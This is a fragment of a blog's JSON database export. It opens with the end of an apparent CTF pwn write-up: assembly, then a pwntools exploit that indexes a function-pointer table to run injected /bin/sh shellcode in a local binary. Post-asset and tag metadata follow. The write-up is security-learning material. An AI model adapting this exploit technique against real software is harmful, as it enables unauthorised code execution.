class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>+<span class=\"number\">4</span>], <span class=\"built_in\">edx</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>], <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">28h</span>]</div><div class=\"line\"><span class=\"keyword\">call</span>    <span class=\"built_in\">eax</span></div></pre></td></tr></table></figure>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight pony\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\"># <span class=\"function\"><span class=\"keyword\">fun</span>[<span class=\"title\">v6</span> - 1]</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">func_addr</span> = 0<span class=\"title\">x804A030</span></div><div class=\"line\"><span class=\"title\">buf_addr</span> = 0<span class=\"title\">x804A0A0</span></div><div class=\"line\"><span class=\"title\">shellcode</span> = <span class=\"title\">shellcraft</span>.<span class=\"title\">i386</span>.<span class=\"title\">sh</span>()</div><div class=\"line\"><span class=\"title\">shellcode</span> = <span class=\"title\">asm</span>(shellcode)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">offset</span> = (buf_addr - func_addr) / 4 + 1</div><div class=\"line\"><span class=\"title\">payload1</span> = <span class=\"title\">str</span>(offset)</div><div class=\"line\"><span class=\"title\">payload2</span> = <span class=\"title\">p32</span>(buf_addr + <span class=\"number\">4</span>)</div><div class=\"line\"><span class=\"title\">payload2</span> += <span class=\"title\">shellcode</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">p</span> = <span class=\"title\">process</span>('./tc')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">recvuntil</span>('<span class=\"type\">Divide</span>\\n')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">sendline</span>(payload1)</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">recvuntil</span>('<span class=\"number\">110</span>]\\n')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">sendline</span>(payload2)</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">interactive</span>()</div></pre></td></tr></table></figure>"}],"PostAsset":[{"_id":"source/_posts/Metasploit-learning/m.png","slug":"m.png","post":"cjcpz0jz9001khv18n01tbgcr","modified":0,"renderable":0},{"_id":"source/_posts/LIEF部分中文文档/3.png","slug":"3.png","post":"cjcpz0jz7001jhv18821mqaxb","modified":0,"renderable":0},{"_id":"source/_posts/LIEF部分中文文档/4.png","slug":"4.png","post":"cjcpz0jz7001jhv18821mqaxb","modified":0,"renderable":0},{"_id":"source/_posts/LIEF部分中文文档/5.png","slug":"5.png","post":"cjcpz0jz7001jhv18821mqaxb","modified":0,"renderable":0},{"_id":"source/_posts/POJ-1003/hangover.jpg","slug":"hangover.jpg","post":"cjcpz0k1b0034hv187si7wvza","modified":0,"renderable":0},{"_id":"source/_posts/glibc-heap导图/heap.png","slug":"heap.png","post":"cjcpz0k2w0041hv18nddppa41","modified":0,"renderable":0},{"_id":"source/_posts/AlexCTF-writeup/1.png","slug":"1.png","post":"cjcpz0jy1000qhv18xyyxpm13","modified":0,"renderable":0},{"_id":"source/_posts/AlexCTF-writeup/2.png","slug":"2.png","post":"cjcpz0jy1000qhv18xyyxpm13","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2010-3333/1.png","slug":"1.png","post":"cjcpz0jyt0019hv18e8ezga5b","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2010-3333/2.png","slug":"2.png","post":"cjcpz0jyt0019hv18e8ezga5b","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2017-7269/1.png","slug":"1.png","post":"cjcpz0jyx001chv18q58fujao","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2017-7269/2.png","slug":"2.png","post":"cjcpz0jyx001chv18q58fujao","modified":0,"renderable":0},{"_id":"source/_posts/PAT-advanced-1066/1.jpg","slug":"1.jpg","post":"cjcpz0k0k002jhv18jq5c0nln","modified":0,"renderable":0},{"_id":"source/_posts/PAT-advanced-1066/2.jpg","slug":"2.jpg","post":"cjcpz0k0k002jhv18jq5c0nln","modified":0,"renderable":0},{"_id":"source/_posts/PAT-advanced-1066/3.jpg","slug":"3.jpg","post":"cjcpz0k0k002jhv18jq5c0nln","modified":0,"renderable":0},{"_id":"source/_posts/PAT-advanced-1066/4.jpg","slug":"4.jpg","post":"cjcpz0k0k002jhv18jq5c0nln","modified":0,"renderable":0},{"_id":"source/_posts/LIEF部分中文文档/2.png","slug":"2.png","post":"cjcpz0jz7001jhv18821mqaxb","modified":0,"renderable":0},{"_id":"source/_posts/LIEF部分中文文档/hashme.png","slug":"hashme.png","post":"cjcpz0jz7001jhv18821mqaxb","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/1.png","slug":"1.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/2.png","slug":"2.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/3.png","slug":"3.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/4.png","slug":"4.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/5.png","slug":"5.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/6.png","slug":"6.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/7.png","slug":"7.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/8.png","slug":"8.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0},{"_id":"source/_posts/2017HCTF赛后整理/9.png","slug":"9.png","post":"cjcpz0jx60007hv18zf84idtj","modified":0,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"cjcpz0jx60007hv18zf84idtj","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxf000ahv18ibuty6sk"},{"post_id":"cjcpz0jwe0000hv18x93imiar","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxh000chv186azzgb5a"},{"post_id":"cjcpz0jwm0002hv1891vo9xkj","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxk000fhv181vaac4xd"},{"post_id":"cjcpz0jxi000dhv1800ggtmps","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxm000hhv1877ym7vgy"},{"post_id":"cjcpz0jxk000ghv18j868erq3","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxq000khv18seyp09vz"},{"post_id":"cjcpz0jxq000lhv18mm2l0l0n","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jxv000ohv183f9r0qa9"},{"post_id":"cjcpz0jx10005hv18wb272tqq","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jy5000thv18wgacfctk"},{"post_id":"cjcpz0jx10005hv18wb272tqq","tag_id":"cjcpz0jxp000jhv18btth7wqc","_id":"cjcpz0jyb000vhv180wgvs72d"},{"post_id":"cjcpz0jx10005hv18wb272tqq","tag_id":"cjcpz0jxv000nhv185ma3kzjh","_id":"cjcpz0jyf000yhv18iywq5q2v"},{"post_id":"cjcpz0jxb0008hv18toz83w5o","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jyh0010hv18ngzkf48z"},{"post_id":"cjcpz0jxb0008hv18toz83w5o","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0jyk0013hv183rytqykq"},{"post_id":"cjcpz0jxf000bhv18rrf07lpw","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jym0015hv18ts6lgjrr"},{"post_id":"cjcpz0jxf000bhv18rrf07lpw","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0jys0018hv18y5w0sy02"},{"post_id":"cjcpz0jxn000ihv18i5dgt6of","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0jyu001ahv18sz0pf1p7"},{"post_id":"cjcpz0jxn000ihv18i5dgt6of","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0jyy001dhv188d2dsydm"},{"post_id":"cjcpz0jxt000mhv18j5lgwfix","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0jz0001fhv1878iquv6a"},{"post_id":"cjcpz0jxv000phv18vaqbfbop","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0jz6001ihv18rs1biddw"},{"post_id":"cjcpz0jy1000qhv18xyyxpm13","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0jza001mhv18a7byt4ze"},{"post_id":"cjcpz0jzb001nhv18mfqbz4fb","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0jzg001qhv184e3yt7vn"},{"post_id":"cjcpz0jy4000shv188bo69d9b","tag_id":"cjcpz0jza001lhv18cjc2an12","_id":"cjcpz0jzl001shv18r6khbz9f"},{"post_id":"cjcpz0jy6000uhv18jcy3kf7f","tag_id":"cjcpz0jzg001phv18v969heu7","_id":"cjcpz0jzq001whv18dickg48w"},{"post_id":"cjcpz0jyb000xhv18vfof5fcv","tag_id":"cjcpz0jzg001phv18v969heu7","_id":"cjcpz0jzw0020hv189rdkfv6d"},{"post_id":"cjcpz0jyg000zhv18t2jf8t2x","tag_id":"cjcpz0jzg001phv18v969heu7","_id":"cjcpz0k000024hv18if0hf0u6"},{"post_id":"cjcpz0jyi0012hv185jrjmnrc","tag_id":"cjcpz0jzg001phv18v969heu7","_id":"cjcpz0k040028hv18fse3z6es"},{"post_id":"cjcpz0jyl0014hv18gty7rwvt","tag_id":"cjcpz0jzg001phv18v969heu7","_id":"cjcpz0k0d002chv181fmir8cn"},{"post_id":"cjcpz0jyr0017hv18s1tt2xf4","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k0i002ghv18hn1nqu4b"},{"post_id":"cjcpz0jyr0017hv18s1tt2xf4","tag_id":"cjcpz0k0b002ahv184haqwjim","_id":"cjcpz0k0k002ihv18qkzfz618"},{"post_id":"cjcpz0jyt0019hv18e8ezga5b","tag_id":"cjcpz0k0f002ehv18zs79uoi5","_id":"cjcpz0k0u002phv1898ljv2a4"},{"post_id":"cjcpz0jyt0019hv18e8ezga5b","tag_id":"cjcpz0k0l002khv186epsr7g6","_id":"cjcpz0k0x002rhv18ptp7a3pk"},{"post_id":"cjcpz0jyx001chv18q58fujao","tag_id":"cjcpz0k0f002ehv18zs79uoi5","_id":"cjcpz0k0z002uhv18qo2fcm59"},{"post_id":"cjcpz0jyz001ehv18ysfmwak3","tag_id":"cjcpz0k0y002shv18zhd0z6qh","_id":"cjcpz0k14002yhv18fvx02xdu"},{"post_id":"cjcpz0jz1001ghv18okf14d6r","tag_id":"cjcpz0k12002whv18ws7pvnp8","_id":"cjcpz0k180032hv187vzan1ol"},{"post_id":"cjcpz0jz7001jhv18821mqaxb","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k1c0036hv183fq7cg9p"},{"post_id":"cjcpz0jz7001jhv18821mqaxb","tag_id":"cjcpz0k170030hv183omv3p0a","_id":"cjcpz0k1p0038hv18x9h3g8p9"},{"post_id":"cjcpz0jz9001khv18n01tbgcr","tag_id":"cjcpz0k1c0035hv18ld7y4ty2","_id":"cjcpz0k1t003chv18plrfmoi2"},{"post_id":"cjcpz0jze001ohv187uro7afd","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k1x003ghv186xuw9kyj"},{"post_id":"cjcpz0k1w003fhv18c9nabmnz","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k24003jhv18wmio9kox"},{"post_id":"cjcpz0jzg001rhv180oxsdgd7","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k29003lhv18e8yprzhj"},{"post_id":"cjcpz0jzl001thv182upvzbtf","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k2j003phv18f8li02u0"},{"post_id":"cjcpz0jzp001vhv182t4iixsu","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k2n003thv188ikcl2wq"},{"post_id":"cjcpz0jzq001xhv18s7l7zbm9","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k2s003xhv18gfsfdji1"},{"post_id":"cjcpz0k2n003uhv184mpv7usf","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k2u003zhv18r4inr33m"},{"post_id":"cjcpz0k2n003uhv184mpv7usf","tag_id":"cjcpz0k0l002khv186epsr7g6","_id":"cjcpz0k2y0042hv18r0l9ujno"},{"post_id":"cjcpz0jzv001zhv18w7oans5p","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k300044hv18j4828t1l"},{"post_id":"cjcpz0k2t003yhv18o1r008li","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k330047hv18gg4b9ux5"},{"post_id":"cjcpz0k2t003yhv18o1r008li","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0k350049hv186uy2vvlr"},{"post_id":"cjcpz0jzw0021hv18vymntrgn","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k38004chv188pxkh9d9"},{"post_id":"cjcpz0jzy0023hv18s66gabec","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k3a004ehv1872o3x2nz"},{"post_id":"cjcpz0k340048hv18131ufk50","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k3e004hhv18iiwvvp0w"},{"post_id":"cjcpz0k340048hv18131ufk50","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0k3h004jhv18odulhief"},{"post_id":"cjcpz0k010025hv18a1r0n712","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k3l004mhv18roy5hct8"},{"post_id":"cjcpz0k030027hv18ftsfzb02","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k41004ohv18v41rxo5q"},{"post_id":"cjcpz0k050029hv18962gc54p","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k46004rhv185uudytto"},{"post_id":"cjcpz0k3l004nhv182hkfrtb3","tag_id":"cjcpz0k170030hv183omv3p0a","_id":"cjcpz0k47004thv184drqg15g"},{"post_id":"cjcpz0k0b002bhv18dk2ucyyr","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k48004whv18gwsb7d15"},{"post_id":"cjcpz0k46004shv18vt50okp3","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k49004yhv18te431hcr"},{"post_id":"cjcpz0k47004vhv18o66379ap","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k4a0051hv181pukjvta"},{"post_id":"cjcpz0k0e002dhv18sra0r35m","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4b0053hv182qgmdyz5"},{"post_id":"cjcpz0k48004xhv18hq20im08","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k4d0056hv18yzmay3of"},{"post_id":"cjcpz0k0g002fhv18ryxugvqg","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4g0058hv18utwl075a"},{"post_id":"cjcpz0k4a0052hv18npmvvktc","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k4h005bhv18xutsiko0"},{"post_id":"cjcpz0k0j002hhv18i7rcnowt","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4i005dhv18d5l9iggd"},{"post_id":"cjcpz0k4f0057hv18hjr7xzch","tag_id":"cjcpz0jyx001bhv18v0b893y0","_id":"cjcpz0k4j005fhv18ot4fxjlz"},{"post_id":"cjcpz0k0k002jhv18jq5c0nln","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4k005ghv186xblmb54"},{"post_id":"cjcpz0k4i005chv1899lq2e7o","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k4k005ihv18j9luubqu"},{"post_id":"cjcpz0k4i005chv1899lq2e7o","tag_id":"cjcpz0jy3000rhv18oxdr5ugr","_id":"cjcpz0k4k005jhv181a20moim"},{"post_id":"cjcpz0k0m002lhv181m0kdfp4","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4l005lhv18nzx6pcyl"},{"post_id":"cjcpz0k0p002mhv18m7lxsphq","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4l005mhv187by21iuu"},{"post_id":"cjcpz0k0s002ohv18vdi0k6mz","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4m005ohv18rmn9wd6n"},{"post_id":"cjcpz0k0w002qhv181rlmyjx5","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4m005qhv18qvqqptza"},{"post_id":"cjcpz0k0y002thv18xux36xiy","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4n005shv18os51oado"},{"post_id":"cjcpz0k10002vhv18qhi8iykc","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4n005uhv18n9xqtsyr"},{"post_id":"cjcpz0k13002xhv18r8l9edyw","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4o005whv180mt10pi0"},{"post_id":"cjcpz0k14002zhv185vo77z77","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4o005yhv18w1ov34na"},{"post_id":"cjcpz0k170031hv187cudcwew","tag_id":"cjcpz0k1r003ahv181uw6aob2","_id":"cjcpz0k4p0060hv18kb9ugkab"},{"post_id":"cjcpz0k190033hv18ctauu4pe","tag_id":"cjcpz0k4p005zhv181cg95twt","_id":"cjcpz0k4q0062hv18tc9re9ad"},{"post_id":"cjcpz0k1b0034hv187si7wvza","tag_id":"cjcpz0k4p005zhv181cg95twt","_id":"cjcpz0k4q0064hv18zeptdftp"},{"post_id":"cjcpz0k1d0037hv18y8xj8enh","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k4q0066hv18wyyinem9"},{"post_id":"cjcpz0k1d0037hv18y8xj8enh","tag_id":"cjcpz0k4q0063hv1854zibtgb","_id":"cjcpz0k4r0067hv18nfn5a1pq"},{"post_id":"cjcpz0k1q0039hv18odd57f6g","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k4r0069hv18takn072o"},{"post_id":"cjcpz0k1q0039hv18odd57f6g","tag_id":"cjcpz0k4q0065hv182qy7gq11","_id":"cjcpz0k4r006ahv18h2gmrsqw"},{"post_id":"cjcpz0k1r003bhv18ppevb78r","tag_id":"cjcpz0k4r0068hv18e8660i7r","_id":"cjcpz0k4v006dhv18p08lh5fe"},{"post_id":"cjcpz0k1r003bhv18ppevb78r","tag_id":"cjcpz0k4r006bhv18d9lje9sp","_id":"cjcpz0k4v006ehv18lzydwusy"},{"post_id":"cjcpz0k1u003dhv18d4vx92mh","tag_id":"cjcpz0k4r006chv18n16teak4","_id":"cjcpz0k4v006ghv182oh1b779"},{"post_id":"cjcpz0k1y003hhv18rymmaj3t","tag_id":"cjcpz0k4v006fhv18gdqgarn9","_id":"cjcpz0k4w006jhv18lx3rziry"},{"post_id":"cjcpz0k1y003hhv18rymmaj3t","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k4w006khv18k20f0xkc"},{"post_id":"cjcpz0k26003khv18863eb0dn","tag_id":"cjcpz0k4v006ihv1863xu6c04","_id":"cjcpz0k4z006nhv18l4m3n76l"},{"post_id":"cjcpz0k26003khv18863eb0dn","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k4z006ohv18a5d6en29"},{"post_id":"cjcpz0k2a003mhv18cbpyy3o7","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k50006rhv18faypx8bs"},{"post_id":"cjcpz0k2a003mhv18cbpyy3o7","tag_id":"cjcpz0k4z006phv18dy66uoyh","_id":"cjcpz0k50006shv18q8t5jwkd"},{"post_id":"cjcpz0k2g003ohv18z4cf0dfm","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k50006vhv1855ik9xem"},{"post_id":"cjcpz0k2g003ohv18z4cf0dfm","tag_id":"cjcpz0k50006thv18pblv5y6i","_id":"cjcpz0k50006whv18up79nwra"},{"post_id":"cjcpz0k2j003qhv186ypgykul","tag_id":"cjcpz0k50006uhv184cet2osm","_id":"cjcpz0k51006zhv186nbqx1hi"},{"post_id":"cjcpz0k2j003qhv186ypgykul","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k510070hv18k3tu10fi"},{"post_id":"cjcpz0k2m003shv18lj65r07w","tag_id":"cjcpz0k50006uhv184cet2osm","_id":"cjcpz0k520073hv181tofq9tc"},{"post_id":"cjcpz0k2m003shv18lj65r07w","tag_id":"cjcpz0k4v006hhv18jx2wc5xd","_id":"cjcpz0k520074hv18hqwz0eer"},{"post_id":"cjcpz0k2q003whv18oswz8axz","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k530076hv18eggpc0yx"},{"post_id":"cjcpz0k2q003whv18oswz8axz","tag_id":"cjcpz0k0l002khv186epsr7g6","_id":"cjcpz0k530077hv1804s6jur4"},{"post_id":"cjcpz0k2q003whv18oswz8axz","tag_id":"cjcpz0k520072hv18aokjnvc9","_id":"cjcpz0k540079hv18gbl6mkm9"},{"post_id":"cjcpz0k2w0041hv18nddppa41","tag_id":"cjcpz0k520075hv186agbj9si","_id":"cjcpz0k54007ahv182esf42tu"},{"post_id":"cjcpz0k2w0041hv18nddppa41","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k56007chv18ncv2wneb"},{"post_id":"cjcpz0k2y0043hv18lk1icuin","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k56007dhv18118mqoeu"},{"post_id":"cjcpz0k2y0043hv18lk1icuin","tag_id":"cjcpz0k520075hv186agbj9si","_id":"cjcpz0k56007fhv18yxgefdhk"},{"post_id":"cjcpz0k320046hv18g62jj3xl","tag_id":"cjcpz0k54007bhv18uxwrevgm","_id":"cjcpz0k57007ghv18xexeobf8"},{"post_id":"cjcpz0k36004bhv18ejptqfdd","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k57007ihv186uyj2jjj"},{"post_id":"cjcpz0k36004bhv18ejptqfdd","tag_id":"cjcpz0k56007ehv18ddbfo7f2","_id":"cjcpz0k58007jhv18qgmjeq4k"},{"post_id":"cjcpz0k39004dhv18oxvzy0qo","tag_id":"cjcpz0jxp000jhv18btth7wqc","_id":"cjcpz0k59007lhv18q9c5ycol"},{"post_id":"cjcpz0k39004dhv18oxvzy0qo","tag_id":"cjcpz0k57007hhv18q0uoh033","_id":"cjcpz0k5a007mhv186uxiyitg"},{"post_id":"cjcpz0k3c004ghv183680rkjr","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k5b007phv18v3fvuybi"},{"post_id":"cjcpz0k3c004ghv183680rkjr","tag_id":"cjcpz0k56007ehv18ddbfo7f2","_id":"cjcpz0k5b007qhv18ki01sa22"},{"post_id":"cjcpz0k3c004ghv183680rkjr","tag_id":"cjcpz0k5a007nhv18ngblcqn7","_id":"cjcpz0k5b007shv182f8xwuxs"},{"post_id":"cjcpz0k3e004ihv187gsv5o46","tag_id":"cjcpz0k5a007ohv18w3xn581m","_id":"cjcpz0k5b007thv1864i8jlks"},{"post_id":"cjcpz0k3i004lhv180rn7hkuz","tag_id":"cjcpz0k5b007rhv18dl6cplaj","_id":"cjcpz0k5c007whv18hvn81b7d"},{"post_id":"cjcpz0k3i004lhv180rn7hkuz","tag_id":"cjcpz0k4r006chv18n16teak4","_id":"cjcpz0k5c007xhv18d3yf0e4o"},{"post_id":"cjcpz0k45004qhv183jtq8hqt","tag_id":"cjcpz0k5c007vhv18rszaehd5","_id":"cjcpz0k5d0080hv1876gyfa4p"},{"post_id":"cjcpz0k45004qhv183jtq8hqt","tag_id":"cjcpz0k5c007yhv18jwrlpukl","_id":"cjcpz0k5d0081hv18o19t3fgf"},{"post_id":"cjcpz0k4c0055hv18so7ivk5f","tag_id":"cjcpz0k5d007zhv18xlavc01z","_id":"cjcpz0k5d0083hv18z69ovhjp"},{"post_id":"cjcpz0k4c0055hv18so7ivk5f","tag_id":"cjcpz0jws0004hv18d8myh7o1","_id":"cjcpz0k5e0084hv181px3m3d5"},{"post_id":"cjcpz0k4h005ahv18ahubd12d","tag_id":"cjcpz0k5d0082hv189g9hqnvo","_id":"cjcpz0k5e0085hv18je2prp4q"}],"Tag":[{"name":"PWN","_id":"cjcpz0jws0004hv18d8myh7o1"},{"name":"pwndbg","_id":"cjcpz0jxp000jhv18btth7wqc"},{"name":"ida","_id":"cjcpz0jxv000nhv185ma3kzjh"},{"name":"writeup","_id":"cjcpz0jy3000rhv18oxdr5ugr"},{"name":"life","_id":"cjcpz0jyx001bhv18v0b893y0"},{"name":"weapon","_id":"cjcpz0jza001lhv18cjc2an12"},{"name":"STL","_id":"cjcpz0jzg001phv18v969heu7"},{"name":"AWD","_id":"cjcpz0k0b002ahv184haqwjim"},{"name":"CVE","_id":"cjcpz0k0f002ehv18zs79uoi5"},{"name":"Win","_id":"cjcpz0k0l002khv186epsr7g6"},{"name":"ML","_id":"cjcpz0k0y002shv18zhd0z6qh"},{"name":"GPLT","_id":"cjcpz0k12002whv18ws7pvnp8"},{"name":"python","_id":"cjcpz0k170030hv183omv3p0a"},{"name":"Metasploit","_id":"cjcpz0k1c0035hv18ld7y4ty2"},{"name":"PAT","_id":"cjcpz0k1r003ahv181uw6aob2"},{"name":"POJ","_id":"cjcpz0k4p005zhv181cg95twt"},{"name":"sandbox","_id":"cjcpz0k4q0063hv1854zibtgb"},{"name":"FILE","_id":"cjcpz0k4q0065hv182qy7gq11"},{"name":"Qt","_id":"cjcpz0k4r0068hv18e8660i7r"},{"name":"C/C++","_id":"cjcpz0k4r006bhv18d9lje9sp"},{"name":"web","_id":"cjcpz0k4r006chv18n16teak4"},{"name":"动态规划","_id":"cjcpz0k4v006fhv18gdqgarn9"},{"name":"UVa","_id":"cjcpz0k4v006hhv18jx2wc5xd"},{"name":"贪心","_id":"cjcpz0k4v006ihv1863xu6c04"},{"name":"中途相遇法","_id":"cjcpz0k4z006phv18dy66uoyh"},{"name":"滑动窗口","_id":"cjcpz0k50006thv18pblv5y6i"},{"name":"构造法","_id":"cjcpz0k50006uhv184cet2osm"},{"name":"SEH","_id":"cjcpz0k520072hv18aokjnvc9"},{"name":"heap","_id":"cjcpz0k520075hv186agbj9si"},{"name":"kernel","_id":"cjcpz0k54007bhv18uxwrevgm"},{"name":"stack","_id":"cjcpz0k56007ehv18ddbfo7f2"},{"name":"libheap","_id":"cjcpz0k57007hhv18q0uoh033"},{"name":"ret2dlresolve","_id":"cjcpz0k5a007nhv18ngblcqn7"},{"name":"win驱动","_id":"cjcpz0k5a007ohv18w3xn581m"},{"name":"yii","_id":"cjcpz0k5b007rhv18dl6cplaj"},{"name":"rookit","_id":"cjcpz0k5c007vhv18rszaehd5"},{"name":"Linux内核","_id":"cjcpz0k5c007yhv18jwrlpukl"},{"name":"2017PediyCTF","_id":"cjcpz0k5d007zhv18xlavc01z"},{"name":"算法概述","_id":"cjcpz0k5d0082hv189g9hqnvo"}]}}